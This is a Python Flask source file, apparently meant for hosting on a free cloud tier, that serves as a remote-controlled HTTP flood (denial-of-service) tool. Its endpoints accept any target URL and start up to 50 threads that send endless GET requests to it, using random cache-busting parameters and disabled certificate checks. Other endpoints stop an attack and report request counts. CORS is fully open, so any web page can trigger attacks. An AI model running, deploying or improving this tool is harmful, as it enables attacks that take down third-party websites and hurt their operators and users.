import os
import threading
import time
import random
import requests
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
from urllib.parse import urlparse

app = Flask(__name__)
# Pełne odblokowanie CORS
CORS(app, resources={r"/*": {"origins": "*"}})

# Globalne statystyki
attack_stats = {}
attack_stop_flags = {}

@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response

def flood(target_url, attack_id):
    while not attack_stop_flags.get(attack_id, False):
        try:
            # Dodanie randomowego parametru zapobiega cache'owaniu
            sep = "&" if "?" in target_url else "?"
            requests.get(f"{target_url}{sep}cb={random.randint(1,999999)}", timeout=5, verify=False)
            if attack_id in attack_stats:
                attack_stats[attack_id]["requests"] += 1
        except:
            pass
        time.sleep(0.1)

@app.route('/', methods=['GET'])
def health():
    return "SERVER ONLINE", 200

@app.route('/api/status', methods=['GET'])
def status():
    return jsonify({"success": True, "status": "online"})

@app.route('/api/attack/start', methods=['POST', 'OPTIONS'])
def start_attack():
    if request.method == 'OPTIONS':
        return make_response("", 200)

    try:
        data = request.json
        url = data.get('url')
        # Na darmowym Renderze nie przekraczaj 50 wątków, bo serwer padnie (502)
        threads_count = min(int(data.get('threads', 20)), 50)
        
        attack_id = f"atk_{int(time.time())}"
        attack_stats[attack_id] = {"requests": 0, "start_time": time.time()}
        attack_stop_flags[attack_id] = False

        for _ in range(threads_count):
            t = threading.Thread(target=flood, args=(url, attack_id))
            t.daemon = True
            t.start()

        return jsonify({"success": True, "attack_id": attack_id})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/attack/stop/<attack_id>', methods=['POST'])
def stop_attack(attack_id):
    attack_stop_flags[attack_id] = True
    return jsonify({"success": True})

@app.route('/api/attack/status/<attack_id>', methods=['GET'])
def get_status(attack_id):
    if attack_id in attack_stats:
        stats = attack_stats[attack_id]
        duration = time.time() - stats["start_time"]
        return jsonify({
            "success": True,
            "requests": stats["requests"],
            "duration": round(duration, 1),
            "active": not attack_stop_flags.get(attack_id, False)
        })
    return jsonify({"success": False}), 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
